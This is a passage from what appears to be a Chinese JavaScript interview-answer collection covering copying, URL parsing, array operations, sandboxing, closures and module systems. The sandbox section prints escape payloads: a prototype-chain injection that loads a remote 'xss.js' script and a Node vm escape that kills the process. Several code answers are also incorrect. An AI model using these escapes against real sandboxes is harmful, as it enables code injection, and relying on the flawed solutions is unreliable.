4];\n    var b = deepCopy(a);\n    b[1][0] = 2;\n    alert(a); // 1,1,2,3,4\n    alert(b); // 2,2,2,3,4\n\n（3）热门的函数库lodash，也有提供_.cloneDeep用来做深拷贝；\nvar _ = require('lodash');\nvar obj1 = &#123;\n    a: 1,\n    b: &#123; f: &#123; g: 1 &#125; &#125;,\n    c: [1, 2, 3]\n&#125;;\nvar obj2 = _.cloneDeep(obj1);\nconsole.log(obj1.b.f === obj2.b.f);\n// false\n\n\n\n47、获取当前页面url参考答案：\n\nwindow.location.href (设置或获取整个 URL 为字符串)\n\nvar test = window.location.href;\nalert(test);\n//  返回：http://i.cnblogs.com/EditPosts.aspx?opt=1\n\n\nwindow.location.protocol (设置或获取 URL 的协议部分)\n\nvar test = window.location.protocol;\nalert(test);\n//返回：http:\n\n\nwindow.location.host (设置或获取 URL 的主机部分)\n\nvar test = window.location.host;\nalert(test);\n//返回：i.cnblogs.com\n\n\nwindow.location.port (设置或获取与 URL 关联的端口号码)\n\nvar test = window.location.port;\nalert(test);\n//返回：空字符(如果采用默认的80端口 (update:即使添加了:80)，那么返回值并不是默认的80而是空字符)\n\n\nwindow.location.pathname (设置或获取与 URL 的路径部分（就是文件地址）)\n\nvar test = window.location.pathname;\nalert(test);\n//返回：/EditPosts.aspx\n\n\nwindow.location.search (设置或获取 href 属性中跟在问号后面的部分)\n\nvar test = window.location.search;\nalert(test);\n//返回：?opt=1\n（PS：获得查询（参数）部分，除了给动态语言赋值以外，我们同样可以给静态页面，并使用javascript来获得相信应的参数值。）\n\n\nwindow.location.hash (设置或获取 href 属性中在井号“#”后面的分段)\n\nvar test = window.location.hash;\nalert(test);\n//返回：空字符(因为url中没有)\n\n\njs获取url中的参数值*\n正则法\n\n\n function getQueryString(name) &#123;\n          var reg = new RegExp('(^|&amp;)' + name + '=([^&amp;]*)(&amp;|$)', 'i');\n          var r = window.location.search.substr(1).match(reg);\n\n          if (r != null) &#123;\n             return unescape(r[2]);\n          &#125;\n          return null;\n  &#125;\n// 这样调用：\nalert(GetQueryString(\"参数名1\"));\nalert(GetQueryString(\"参数名2\"));\nalert(GetQueryString(\"参数名3\"));\n\n split拆分法\nfunction GetRequest() &#123;\n         var url = location.search; //获取url中\"?\"符后的字串\n         var theRequest = new Object();\n\n         if (url.indexOf(\"?\") != -1) &#123;\n                 var str = url.substr(1);\n                 strs = str.split(\"&amp;\");\n              for(var i = 0; i &lt; strs.length; i ++) &#123;\n                      theRequest[strs[i].split(\"=\")[0]] = unescape(strs[i].split(\"=\")[1]);\n               &#125;\n         &#125;\n     return theRequest;\n &#125;\nvar Request = new Object();\nRequest = GetRequest();&lt;br>// var id=Request[\"id\"]; \n// var 参数1,参数2,参数3,参数N;\n// 参数1 = Request['参数1'];\n// 参数2 = Request['参数2'];\n// 参数3 = Request['参数3'];\n// 参数N = Request['参数N'];\n\n 指定取比如说一个url：http://i.cnblogs.com/?j=js, 我们想得到参数j的值，可以通过以下函数调用。\nfunction GetQueryString(name) &#123; \n         var reg = new RegExp(\"(^|&amp;)\" + name + \"=([^&amp;]*)(&amp;|$)\", \"i\"); \n         var r = window.location.search.substr(1).match(reg); //获取url中\"?\"符后的字符串并正则匹配\n         var context = \"\"; \n\n     if (r != null) \n     context = r[2]; \n    reg = null; \n    r = null; \n    return context == null || context == \"\" || context == \"undefined\" ? \"\" : context; \n &#125;\nalert(GetQueryString(\"j\"));\n\n 单个参数的获取方法\nfunction GetRequest() &#123;\n         var url = location.search; //获取url中\"?\"符后的字串\n         if (url.indexOf(\"?\") != -1) &#123;? //判断是否有参数\n                  var str = url.substr(1); //从第一个字符开始 因为第0个是?号 获取所有除问号的所有符串\n                  strs = str.split(\"=\");? //用等号进行分隔 （因为知道只有一个参数 \n                                          //所以直接用等号进分隔 如果有多个参数 要用&amp;号分隔 再用等号进行分隔）\n                  alert(strs[1]);???? //直接弹出第一个参数 （如果有多个参数 还要进行循环的）\n         &#125;\n  &#125;\n\n\n\n\n\n48、js中两个数组怎么取交集+(差集、并集、补集)ES5：交集：\nlet arr1 = [1, 2, 3, 4, 5, 6];\nlet arr2 = [3, 4, 5, 6, 7, 8, 9];\nfunction getIntersection(arr1, arr2) &#123;\n  let newArr = arr1.filter((item) => &#123;\n    console.log(arr2.indexOf(item));\n    return arr2.indexOf(item) > -1\n  &#125;);\n  return newArr;\n&#125;\n// console.log(getIntersection(arr1, arr2));\n\n\n\n并集：\nfunction getSet(arr1, arr2) &#123;\n  let newArr = arr2.filter((item) => &#123;\n    return arr1.indexOf(item) == -1;\n  &#125;);\n  return arr1.concat(newArr);\n&#125;\nconsole.log(getSet(arr1, arr2));\n\n\n补集：\nfunction getComplement(arr1, arr2) &#123;\n  let newArr1 = arr1.filter((item) => &#123;\n    return arr2.indexOf(item) == -1;\n  &#125;);\n  let newArr2 = arr2.filter((item) => &#123;\n    return arr1.indexOf(item) == -1;\n  &#125;);\n  return newArr1.concat(newArr2);\n&#125;\n\n\n\nES6：交集：\nlet arr1 = [1, 2, 3, 4, 5, 6];\nlet arr2 = [3, 4, 5, 6, 7, 8, 9];\n\nfunction getIntersection(arr1, arr2) &#123;\n  let y = new Set(arr2);\n  return arr1.filter((x) => y.has(x));\n&#125;\nconsole.log(getIntersection(arr1, arr2));\n\n\n\n\n并集：\nlet arr1 = [1, 2, 3, 4, 5, 6];\nlet arr2 = [3, 4, 5, 6, 7, 8, 9];\nfunction getSet(arr1, arr2) &#123;\n  let x = arr1.concat(arr2);\n  return [...new Set(x)];\n&#125;\nconsole.log(getSet(arr1, arr2));\n\n\n\n\n49、沙箱隔离怎么做的什么原理参考答案：\n沙箱，即sandbox，顾名思义，就是让你的程序跑在一个隔离的环境下，不对外界的其他程序造成影响，通过创建类似沙盒的独立作业环境，在其内部运行的程序并不能对硬盘产生永久性的影响。\n实现沙箱的三种方法\n\n借助with + new Function\n\n首先从最简陋的方法说起，假如你想要通过eval和function直接执行一段代码，这是不现实的，因为代码内部可以沿着作用域链往上找，篡改全局变量，这是我们不希望的，所以你需要让沙箱内的变量访问都在你的监控范围内；不过，你可以使用with API，在with的块级作用域下，变量访问会优先查找你传入的参数对象，之后再往上找，所以相当于你变相监控到了代码中的“变量访问”：\nfunction compileCode (src) &#123;    \n  src = 'with (exposeObj) &#123;' + src + '&#125;'  \n  return new Function('exposeObj', src)   \n&#125;\n\n接下里你要做的是，就是暴露可以被访问的变量exposeObj，以及阻断沙箱内的对外访问。通过es6提供的proxy特性，可以获取到对对象上的所有改写：\nfunction compileCode (src) &#123;    \n  src = `with (exposeObj) &#123; $&#123;src&#125; &#125;` \n  return new Function('exposeObj', src)   \n&#125; \nfunction proxyObj(originObj)&#123; \n    let exposeObj = new Proxy(originObj,&#123; \n        has:(target,key)=>&#123; \n            if([\"console\",\"Math\",\"Date\"].indexOf(key)>=0)&#123;  \n                return target[key]  \n            &#125; \n            if(!target.hasOwnProperty(key))&#123;  \n                throw new Error(`Illegal operation for key $&#123;key&#125;`) \n            &#125; \n            return target[key]  \n        &#125;,\n    &#125;)  \n    return exposeObj  \n\n&#125; \nfunction createSandbox(src,obj)&#123;  \n let proxy = proxyObj(obj)  \n compileCode(src).call(proxy,proxy) //绑定this 防止this访问window \n&#125;\n\n通过设置has函数，可以监听到变量的访问，在上述代码中，仅暴露个别外部变量供代码访问，其余不存在的属性，都会直接抛出error。其实还存在get、set函数，但是如果get和set函数只能拦截到当前对象属性的操作，对外部变量属性的读写操作无法监听到，所以只能使用has函数了。接下来我们测试一下：\nconst testObj = &#123; \n    value:1,  \n    a:&#123; \n        b:  \n    &#125; \n&#125; \ncreateSandbox(\"value='haha';console.log(a)\",testObj)\n\n看起来一切似乎没有什么问题，但是问题出在了传入的对象，当调用的是console.log(a.b)的时候，has方法是无法监听到对b属性的访问的，假设所执行的代码是不可信的，这时候，它只需要通过a.b.proto就可以访问到Object构造函数的原型对象，再对原型对象进行一些篡改，例如将toString就能影响到外部的代码逻辑的。\ncreateSandbox(` \na.b.__proto__.toString = ()=>&#123;  \n new (()=>&#123;&#125;).constructor(\"var script = document.createElement('script'); \n script.src = 'http://xss.js';\n script.type = 'text/javascript'; \n document.body.appendChild(script);\")() \n&#125;\n`,testObj)  \nconsole.log(testObj.a.b.__proto__.toString())\n\n例如上面所展示的代码，通过访问原型链的方式，实现了沙箱逃逸，并且篡改了原型链上的toString方法，一旦外部的代码执行了toString方法，就可以实现xss攻击，注入第三方代码；由于在内部定义执行的函数代码逻辑，仍然会沿着作用于链查找，为了绕开作用域链的查找，笔者通过访问箭头函数的constructor的方式拿到了构造函数Function，这个时候，Funtion内所执行的xss代码，在执行的时候，便不会再沿着作用域链往上找，而是直接在全局作用域下执行，通过这样的方式，实现了沙箱逃逸以及xss攻击。\n你可能会想，如果我切断原型链的访问，是否就杜绝了呢？的确，你可以通过Object.create(null)的方式，传入一个不含有原型链的对象，并且让暴露的对象只有一层，不传入嵌套的对象，但是，即使是基本类型值，数字或字符串，同样也可以通过proto查找到原型链，而且，即使不传入对象，你还可以通过下面这种方式绕过：\n(&#123;&#125;).__proto__.toString= ()=>&#123;console.log(111)&#125;;\n\n可见，new Function + with的这种沙箱方式，防君子不防小人，当然，你也可以通过对传入的code代码做代码分析或过滤？假如传入的代码不是按照的规定的数据格式（例如json），就直接抛出错误，阻止恶意代码注入，但这始终不是一种安全的做法。\n\n借助iframe实现沙箱\n\n前面介绍一种劣质的、不怎么安全的方法构造了一个简单的沙箱，但是在前端最常见的方法，还是利用iframe来构造一个沙箱\n&lt;iframe sandbox src=\"...\">&lt;/iframe>\n\n 但是这也会带来一些限制：\n\nscript脚本不能执行\n\n不能发送ajax请求\n\n不能使用本地存储，即localStorage,cookie等\n\n不能创建新的弹窗和window\n\n不能发送表单\n\n不能加载额外插件比如flash等\n不过别方，你可以对这个iframe标签进行一些配置：\n\n\n\n接下里你只需要结合postMessage API，将你需要执行的代码，和需要暴露的数据传递过去，然后和你的iframe页面通信就行了。\n1）需要注意的是，在子页面中，要注意不要让执行代码访问到contentWindow对象，因为你需要调用contentWindow的postMessageAPI给父页面传递信息，假如恶意代码也获取到了contentWindow对象，相当于就拿到了父页面的控制权了，这个时候可大事不妙。\n2）当使用postMessageAPI的时候，由于sandbox的origin默认为null，需要设置allow-same-origin允许两个页面进行通信，意味着子页面内可以发起请求，这时候需要防范好CSRF，允许了同域请求，不过好在，并没有携带上cookie。\n3）当调用postMessageAPI传递数据给子页面的时候，传输的数据对象本身已经通过结构化克隆算法复制\n简单的说，通过postMessageAPI传递的对象，已经由浏览器处理过了，原型链已经被切断，同时，传过去的对象也是复制好了的，占用的是不同的内存空间，两者互不影响，所以你不需要担心出现第一种沙箱做法中出现的问题。\n\nnodejs中的沙箱\n\nnodejs中使用沙箱很简单，只需要利用原生的vm模块，便可以快速创建沙箱，同时指定上下文。\nconst vm = require('vm'); \nconst x = 1;  \nconst sandbox = &#123; x: 2 &#125;; \nvm.createContext(sandbox); // Contextify the sandbox. \nconst code = 'x += 40; var y = 17;';  \nvm.runInContext(code, sandbox); \nconsole.log(sandbox.x); // 42 \nconsole.log(sandbox.y); // 17 \nconsole.log(x); // 1;   y is not defined.\n\nvm中提供了runInNewContext、runInThisContext、runInContext三个方法，三者的用法有个别出入，比较常用的是runInNewContext和runInContext，可以传入参数指定好上下文对象。\n但是vm是绝对安全的吗？不一定。\nconst vm = require('vm'); \nvm.runInNewContext(\"this.constructor.constructor('return process')().exit()\")\n\n通过上面这段代码，我们可以通过vm，停止掉主进程nodejs，导致程序不能继续往下执行，这是我们不希望的，解决方案是绑定好context上下文对象，同时，为了避免通过原型链逃逸（nodejs中的对象并没有像浏览器端一样进行结构化复制，导致原型链依然保留），所以我们需要切断原型链，同时对于传入的暴露对象，只提供基本类型值。\nlet ctx = Object.create(null);  \nctx.a = 1; // ctx上不能包含引用类型的属性 \nvm.runInNewContext(\"this.constructor.constructor('return process')().exit()\", ctx);\n\n让我们来看一下TSW中是怎么使用的：\nconst vm = require('vm'); \nconst SbFunction = vm.runInNewContext('(Function)', Object.create(null));        // 沙堆  \n... \nif (opt.jsonpCallback) &#123;  \n  code = `var result=null; var $&#123;opt.jsonpCallback&#125;=function($1)&#123;result=$1&#125;; $&#123;responseText&#125;; return result;`;  \n  obj = new SbFunction(code)(); \n&#125;   \n... \n\n通过runInNewContext返回沙箱中的构造函数Function，同时传入切断原型链的空对象防止逃逸，之后再外部使用的时候，只需要调用返回的这个函数，和普通的new Function一样调用即可。\n53、闭包的理解参考答案：\n闭包：\n 一个函数和对其周围状态（lexical environment，词法环境）的引用捆绑在一起（或者说函数被引用包围）， 这样的组合就是闭包（closure）。也就是说，闭包让你可以在一个内层函数中访问到其外层函数的作用域。在 JavaScript 中，每当创建一个函数，闭包就会在函数创建的同时被创建出来。\n闭包的特点：\n 让外部访问函数内部变量成为可能；​ 可以避免使用全局变量，防止全局变量污染；​ 可以让局部变量常驻在内存中；​ 会造成内存泄漏（有一块内存空间被长期占用，而不被释放）\n应用场景\n\n埋点（是网站分析的一种常用的数据采集方法）计数器\n\nfunction count() &#123;\n  var num = 0;\n  return function () &#123;\n    return ++num\n  &#125;\n&#125;\nvar getNum = count();\nvar getNewNum = count();\ndocument.querySelectorAll('button')[0].onclick = function()&#123;\n  console.log('点击加入购物车次数： '+getNum());\n&#125;\ndocument.querySelectorAll('button')[1].onclick = function()&#123;\n  console.log('点击付款次数： '+getNewNum());\n&#125;    \n\n\n事件+循环\n\n按照以下方式添加事件，打印出来的i不是按照序号的\n形成原因就是操作的是同一个词法环境,因为onclick后面的函数都是一个闭包，但是操作的是同一个词法环境\nvar lis = document.querySelectorAll('li');\nfor (var i = 0; i &lt; lis.length; i++) &#123;\n         lis[i].onclick = function () &#123;\n             alert(i)\n         &#125;       \n &#125;\n\n解决办法：\n使用匿名函数之后，就形成一个闭包， 操作的就是不同的词法环境\nvar lis = document.querySelectorAll('li');  \nfor (var i = 0; i &lt; lis.length; i++) &#123;\n     (function (j) &#123;\n                lis[j].onclick = function () &#123;\n                    alert(j)\n                &#125;\n            &#125;)(i)\n &#125;\n\n\n\nJS应用篇字符串中的单词逆序输出（手写）let str = \"Hello My name is kif and i am from XTU\";\nfunction reChange1(str) &#123;\n  return str.split(\"\").reverse().join(\"\");\n&#125;\nconsole.log(reChange1(str));\n\n\n\nlet str = \"Hello My name is kif and i am from XTU\";\nfunction reChange2(str) &#123;\n  let newSTr = \"\";\n  for (let i = str.length - 1; i >= 0; i--) &#123;\n    newSTr += str.charAt(i);\n  &#125;\n  return newSTr\n\nconsole.log(reChange2(str));\n\n\n\nfunction rand(min, max, N)：生成长度是N，且在min、max内不重复的整数随机数组参考答案：\n把考点拆成了4个小项；需要用递归算法实现：a) 生成一个长度为n的空数组arr。b) 生成一个（min－max）之间的随机整数rand。c) 把随机数rand插入到数组arr内，如果数组arr内已存在与rand相同的数字，则重新生成随机数rand并插入到 arr内[需要使用递归实现，不能使用for&#x2F;while等循环]d) 最终输出一个长度为n，且内容不重复的数组arr。\nMath.random//产生一个[0，1)之间的随机数。\nMath.random()：\n \n//返回指定范围的随机数(m-n之间)的公式:\nMath.random()*(n-m)+m；\n或者\nMath.random()*(n+1-m)+m\n\n\n\nfunction buildArray(arr, n, min, max) &#123;\n    var num = Math.floor(Math.random() * (max - min + 1)) + min;\n    if (!arr.includes(num)) &#123; arr.push(num); &#125;\n    return arr.length === n ? arr : buildArray(arr, n, min, max);\n&#125;\nvar result = buildArray([], 5, 2, 32);\nconsole.table(result);\n\n\n\nfunction rand(min, max, N) &#123;\n  let arr = [];\n  let l = 0;\n  console.log(N);\n  for (; l &lt; N; ) &#123;\n    // console.log(l);\n    let r = Math.floor(Math.random() * (max - min)) + min;\n    if (!arr.includes(r)) &#123;\n      console.log(r);\n      arr.push(r);\n      l++;\n    &#125;\n  &#125;\n  return arr;\n&#125;\nconsole.log(rand(2, 61, 5));\n\n\n\n\n实现一个数组对象的去重，相同value的只保留最后一个，最好有多个思路参考答案：\n1.遍历数组法\n它是最简单的数组去重方法（indexOf方法）\n实现思路：新建一个数组，遍历去要重的数组，当值不在新数组的时候（indexOf为-1）就加入该新数组中；\nvar arr=[2,8,5,0,5,2,6,7,2];\nfunction unique1(arr)&#123;\n  var hash=[];\n  for (var i = 0; i &lt; arr.length; i++) &#123;\n     if(hash.indexOf(arr[i])==-1)&#123;\n      hash.push(arr[i]);\n     &#125;\n  &#125;\n  return hash;\n&#125;\n\n2.数组下标判断法\n调用indexOf方法，性能和方法1差不多\n实现思路：如果当前数组的第 i 项在当前数组中第一次出现的位置不是 i，那么表示第 i 项是重复的，忽略掉。否则存入结果数组。\nfunction unique2(arr)&#123;\n  var hash=[];\n  for (var i = 0; i &lt; arr.length; i++) &#123;\n     if(arr.indexOf(arr[i])==i)&#123;\n      hash.push(arr[i]);\n     &#125;\n  &#125;\n  return hash;\n&#125;\n\n3.排序后相邻去除法\n实现思路：给传入的数组排序，排序后相同的值会相邻，然后遍历排序后数组时，新数组只加入不与前一值重复的值。\nfunction unique3(arr)&#123;\n  arr.sort();\n  var hash=[arr[0]];\n  for (var i = 1; i &lt; arr.length; i++) &#123;\n     if(arr[i]!=hash[hash.length-1])&#123;\n      hash.push(arr[i]);\n     &#125;\n  &#125;\n  return hash;\n&#125;\n\n4.优化遍历数组法（推荐）\n实现思路：双层循环，外循环表示从0到arr.length，内循环表示从i+1到arr.length\n将没重复的右边值放入新数组。（检测到有重复值时终止当前循环同时进入外层循环的下一轮判断）\nfunction unique4(arr)&#123;\n  var hash=[];\n  for (var i = 0; i &lt; arr.length; i++) &#123;\n    for (var j = i+1; j &lt; arr.length; j++) &#123;\n      if(arr[i]===arr[j])&#123;\n        ++i;\n        break;\n        &#125;\n    &#125;\n      hash.push(arr[i]);\n  &#125;\n  return hash;\n&#125;\n\n5.ES6实现\n基本思路：ES6提供了新的数据结构Set。它类似于数组，但是成员的值都是唯一的，没有重复的值。\nSet函数可以接受一个数组（或类似数组的对象）作为参数，用来初始化。\nfunction unique5(arr)&#123;\n  var x = new Set(arr);\n return [...x];\n&#125;\n\n扩展：如果重复，则去掉该元素\n数组下标去重\nfunction unique22(arr)&#123;\n  var hash=[];\n  for (var i = 0; i &lt; arr.length; i++) &#123;\n     if(arr.indexOf(arr[i])==arr.lastIndexOf(arr[i]))&#123;\n      hash.push(arr[i]);\n     &#125;\n  &#125;\n  return hash;\n&#125;\n\n传入 [1,[[2],3,4],5] ，返回 [1,2,3,4,5]let a = [1, [[2], '3', 4], 5];\nfunction change(arr) &#123;\n  let x = arr.toString();\n  let list = x.split(\",\");\n  let ans = list.map((i) => &#123;\n    // console.log(i)\n    return typeof i === 'string' ? Number(i) : i;\n  &#125;);\n  // console.log(ans)\n  return ans;\n&#125;\nconsole.log(change(a));\n\n\n​       \nES6 增加了扩展运算符，用于取出参数对象的所有可遍历属性，拷贝到当前对象之中：\nvar arr = [1, [2, [3, 4]]];\nconsole.log([].concat(...arr)); // [1, 2, [3, 4]]\n\n我们用这种方法只可以扁平一层，但是顺着这个方法一直思考，我们可以写出这样的方法：\n// 方法4\nvar arr = [1, [2, [3, 4]]];\n\nfunction flatten(arr) &#123;\n\n    while (arr.some(item => Array.isArray(item))) &#123;\n        arr = [].concat(...arr);\n    &#125;\n\n    return arr;\n&#125;\n\nconsole.log(flatten(arr))\n\n\n\n用正则和非正则实现12345678.12&#x3D;》12，345，678.12let num = 12345678.12\n//12,345,678.12\nfunction change(number) &#123;\n    let s = number.toString()\n    //console.log(s)\n    let L = s.split('.')\n    let num_s\n    L.length == 2 ? num_s = L[1] : num_s = -1\n    let N=L[0]\n    let num_f\n    let y =N.length % 3\n    num_f = N.slice(0, y)\n\n    for (let i = y; i &lt; N.length; i += 3) &#123;\n        num_f += ',' + N.slice(i,i+3)\n    &#125;\n    if (num_s != -1) &#123;\n        num_f += '.' + num_s\n    &#125;\n    return num_f\n&#125;\nconsole.log(change(num))//12,345,678.12\n\n\n\n写一个判断是否是空对象的函数参考答案：\nfunction isEmpty(value) &#123;\n    return (\n        value === null || value === undefined ||\n        (typeof value === 'object' &amp;&amp; Object.keys(value).length === 0) \n    )\n&#125;\n\n\n\n给定一个字符串，请你找出其中不含有重复字符的 最长子串 的长度function countWord(str) &#123;\n  let arr = [];\n  let count = 0;\n  for (let i = 0; i &lt; str.length; i++) &#123;\n    console.log(str.charAt(i));\n    if (!arr.includes(str.charAt(i))) &#123;\n      arr.push(str[i]);\n      count++;\n    &#125;\n  &#125;\n  console.log(arr);\n  return count;\n&#125;\nlet str = \"qqdwqcasdffdghjsbjhbm\";\nconsole.log(countWord(str));\n\n\n\n\n三数之和参考答案：\n题目描述\n给定一个包含 n 个整数的数组 nums，判断 nums 中是否存在三个元素 a，b，c ，使得 a + b + c &#x3D; 0 ？找出所有满足条件且不重复的三元组。\n注意：答案中不可以包含重复的三元组。\n//例如, 给定数组 nums = [-1, 0, 1, 2, -1, -4]，\n//满足要求的三元组集合为：\n[\n  [-1, 0, 1],\n  [-1, -1, 2]\n]\n\n\n\n\n\nlet nums = [-1, 0, 1, 2, -1, -4];\nfunction getNum(nums) &#123;\n  if (nums.length &lt; 3) &#123;\n    return [];\n  &#125;\n  let ans = [];\n  nums.sort((a, b) => a - b);\n  console.log(nums);\n  for (let i = 0; i &lt; nums.length; i++) &#123;\n    if (nums[i] > 0) &#123;\n      break;\n    &#125;\n    let l = i + 1;\n    let r = nums.length - 1;\n    while (l &lt; r) &#123;\n      let sum = nums[i] + nums[l] + nums[r];\n      if (sum == 0) &#123;\n        ans.push(nums[i], nums[l], nums[r]);\n        l++;\n        r++;\n      &#125; else if (sum > 0) &#123;\n        r--;\n      &#125; else &#123;\n        l++;\n      &#125;\n    &#125;\n  &#125;\n  return ans;\n&#125;\nconsole.log(getNum(nums));\n\n\n\n\n\n\n\n\n\n\n\n\n代码解释题\n\n\nvar company = &#123;\n    address: 'beijing'\n&#125;\nvar yideng = Object.create(company);\ndelete yideng.address\nconsole.log(yideng.address);\n// 写出执行结果，并解释原因\n\n\n答案beijing\n解析这里的 yideng 通过 prototype 继承了 company的 address。yideng自己并没有address属性。所以delete操作符的作用是无效的。\n扩展1.delete使用原则：delete 操作符用来删除一个对象的属性。2.delete在删除一个不可配置的属性时在严格模式和非严格模式下的区别:（1）在严格模式中，如果属性是一个不可配置（non-configurable）属性，删除时会抛出异常;（2）非严格模式下返回 false。3.delete能删除隐式声明的全局变量：这个全局变量其实是global对象(window)的属性4.delete能删除的：（1）可配置对象的属性（2）隐式声明的全局变量 （3）用户定义的属性 （4）在ECMAScript 6中，通过 const 或 let 声明指定的 “temporal dead zone” (TDZ) 对 delete 操作符也会起作用delete不能删除的：（2）显式声明的全局变量 （2）内置对象的内置属性 （3）一个对象从原型继承而来的属性5.delete删除数组元素：（1）当你删除一个数组元素时，数组的 length 属性并不会变小，数组元素变成undefined（2）当用 delete 操作符删除一个数组元素时，被删除的元素已经完全不属于该数组。（3）如果你想让一个数组元素的值变为 undefined 而不是删除它，可以使用 undefined 给其赋值而不是使用 delete 操作符。此时数组元素是在数组中的6.delete 操作符与直接释放内存（只能通过解除引用来间接释放）没有关系。\n模块化CommonJS规范参考答案：\nCommonJS规范加载模块是同步的，只有加载完成，才能执行后面的操作。\nCommonJS规范中的module、exports和require\n\n每个文件就是一个模块，有自己的作用域。每个模块内部，module变量代表当前模块，是一个对象，它的exports属性（即module.exports）是对外的接口。\nmodule.exports属性表示当前模块对外输出的接口，其他文件加载该模块，实际上就是读取module.exports变量。\n为了方便，Node为每个模块提供一个exports变量，指向module.exports。\n\nlet exports = module.exports;\n\n\nrequire命令用于加载模块文件。\n\n使用示例：\n//name.js\nexports.name = function()&#123;return '李婷婷'&#125;; //导出\n//getName.js\nlet getName = require('name'); //引入\n\n注：不能直接将exports变量指向一个值，因为这样等于切断了exports与module.exports的联系：如下\nexports = function(x)&#123;console.log(x)&#125;\n\n如果一个模块的对外接口，就是一个单一的值，不能使用exports输出，只能使用module.exports输出。\nCommonJS模块导入用require，导出用module.exports。导出的对象需注意，如果是静态值，而且非常量，后期可能会有所改动的，请使用函数动态获取，否则无法获取修改值。导入的参数，是可以随意改动的，所以使用时要注意\nES6 module 和 CommonJS module 的区别参考答案：\n\n为CommonJS的require语法是同步的，所以就导致了CommonJS模块规范只适合用在服务端，而ES6模块无论是在浏览器端还是服务端都是可以使用的，但是在服务端中，还需要遵循一些特殊的规则才能使用 ；\nCommonJS 模块输出的是一个值的拷贝，而ES6 模块输出的是值的引用；\nCommonJS 模块是运行时加载，而ES6 模块是编译时输出接口，使得对JS的模块进行静态分析成为了可能\n因为两个模块加载机制的不同，所以在对待循环加载的时候，它们会有不同的表现。CommonJS遇到循环依赖的时候，只会输出已经执行的部分，后续的输出或者变化，是不会影响已经输出的变量。而ES6模块相反，使用import加载一个变量，变量不会被缓存，真正取值的时候就能取到最终的值；\n关于模块顶层的this指向问题，在CommonJS顶层，this指向当前模块；而在ES6模块中，this指向undefined；\n关于两个模块互相引用的问题，在ES6模块当中，是支持加载CommonJS模块的。但是反过来，CommonJS并不能requireES6模块，在NodeJS中，两种模块方案是分开处理的。\n\nES6 module、CommonJS module 循环引用的问题参考答案：\n 循环加载指的是a脚本的执行依赖b脚本，b脚本的执行依赖a脚本\n\nCommonJS模块是加载时执行。一旦出现某个模块被“循环加载”，就只输出已经执行的部分，没有执行的部分不会输出。\n\nES6模块对导出模块，变量，对象是动态引用，遇到模块加载命令import时不会去执行模块，只是生成一个指向被加载模块的引用。\nCommonJS模块规范主要适用于后端Node.js，后端Node.js是同步模块加载，所以在模块循环引入时模块已经执行完毕。推荐前端工程中使用ES6的模块规范，通过安装Babel转码插件支持ES6模块引入的语法。\n\n\n解析：\n\nCommonJS模块的加载原理\n\nCommonJS模块就是一个脚本文件，require命令第一次加载该脚本时就会执行整个脚本，然后在内存中生成该模块的一个说明对象。\n&#123;\n    id: '',  //模块名，唯一\n    exports: &#123;  //模块输出的各个接口\n        ...\n    &#125;,\n    loaded: true,  //模块的脚本是否执行完毕\n    ...\n&#125;\n\n以后用到这个模块时，就会到对象的exports属性中取值。即使再次执行require命令，也不会再次执行该模块，而是到缓存中取值。\nCommonJS模块是加载时执行，即脚本代码在require时就全部执行。一旦出现某个模块被“循环加载”，就只输出已经执行的部分，没有执行的部分不会输出。\n案例说明：\n案例来源于Node官方说明：nodejs.org&#x2F;api&#x2F;modules…\n//a.js\nexports.done = false;\n\nvar b = require('./b.js');\nconsole.log('在a.js中，b.done = %j', b.done);\n\nexports.done = true;\nconsole.log('a.js执行完毕！')\n\n//b.js\nexports.done = false;\n\nvar a = require('./a.js');\nconsole.log('在b.js中，a.done = %j', a.done);\n\nexports.done = true;\nconsole.log('b.js执行完毕！')\n\n//main.js\nvar a = require('./a.js');\nvar b = require('./b.js');\n\nconsole.log('在main.js中，a.done = %j, b.done = %j', a.done, b.done);\n\n输出结果如下：\n&#x2F;&#x2F;node环境下运行main.js\nnode main.js\n\n在b.js中，a.done &#x3D; false\nb.js执行完毕！\n在a.js中，b.done &#x3D; true\na.js执行完毕！\n在main.js中，a.done &#x3D; true, b.done &#x3D; true\n\nJS代码执行顺序如下：\n1）main.js中先加载a.js，a脚本先输出done变量，值为false，然后加载b脚本，a的代码停止执行，等待b脚本执行完成后，才会继续往下执行。\n2）b.js执行到第二行会去加载a.js，这时发生循环加载，系统会去a.js模块对应对象的exports属性取值，因为a.js没执行完，从exports属性只能取回已经执行的部分，未执行的部分不返回，所以取回的值并不是最后的值。\n3）a.js已执行的代码只有一行，exports.done &#x3D; false;所以对于b.js来说，require a.js只输出了一个变量done，值为false。往下执行console.log(‘在b.js中，a.done &#x3D; %j’, a.done);控制台打印出：\n在b.js中，a.done &#x3D; false\n\n4）b.js继续往下执行，done变量设置为true，console.log(‘b.js执行完毕！’)，等到全部执行完毕，将执行权交还给a.js。此时控制台输出：\nb.js执行完毕！\n\n5）执行权交给a.js后，a.js接着往下执行，执行console.log(‘在a.js中，b.done &#x3D; %j’, b.done);控制台打印出：\n在a.js中，b.done &#x3D; true\n\n6）a.js继续执行，变量done设置为true，直到a.js执行完毕。\na.js执行完毕！\n\n7）main.js中第二行不会再次执行b.js，直接输出缓存结果。最后控制台输出：\n在main.js中，a.done &#x3D; true, b.done &#x3D; true\n\n总结：\n1）在b.js中，a.js没有执行完毕，只执行了第一行，所以循环加载中，只输出已执行的部分。\n2）main.js第二行不会再次执行，而是输出缓存b.js的执行结果。exports.done &#x3D; true;\n\nES6模块的循环加载\n\nES6模块与CommonJS有本质区别，ES6模块对导出变量，方法，对象是动态引用，遇到模块加载命令import时不会去执行模块，只是生成一个指向被加载模块的引用，需要开发者保证真正取值时能够取到值，只要引用是存在的，代码就能执行。\n案例说明：\n//even.js\nimport &#123;odd&#125; from './odd';\n\nvar counter = 0;\nexport function even(n)&#123;\n    counter ++;\n    console.log(counter);\n\n    return n == 0 || odd(n-1);\n&#125;\n复制代码\n//odd.js\nimport &#123;even&#125; from './even.js';\n\nexport function odd(n)&#123;\n    return n != 0 &amp;&amp; even(n-1);\n&#125;\n复制代码\n//index.js\nimport * as m from './even.js';\n\nvar x = m.even(5);\nconsole.log(x);\n\nvar y = m.even(4);\nconsole.log(y);\n\n执行index.js，输出结果如下：\nbabel-node index.js\n\n1\n2\n3\nfalse\n4\n5\n6\ntrue\n\n可以看出counter的值是累加的，ES6是动态引用。如果上面的引用改为CommonJS代码，会报错，因为在odd.js里，even.js代码并没有执行。改成CommonJS规范加载的代码为：\n//even.js\nvar odd = require('./odd.js');\n\nvar counter = 0;\nmodule.exports = function even(n)&#123;\n    counter ++;\n    console.log(counter);\n\n    return n == 0 || 